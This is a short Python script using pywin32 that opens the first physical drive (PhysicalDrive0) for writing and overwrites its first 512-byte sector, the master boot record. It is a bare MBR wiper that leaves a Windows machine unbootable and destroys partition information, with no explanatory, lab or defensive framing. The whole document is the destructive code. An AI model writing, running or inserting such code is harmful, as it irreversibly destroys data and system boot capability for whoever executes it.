from win32file import * # pip install pywin32
from win32ui import * # MessageBox
from win32con import * # MessageBox buttons
from win32gui import *
from sys import exit

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) 
WriteFile(hDevice, AllocateReadBuffer(512), None) 
CloseHandle(hDevice) 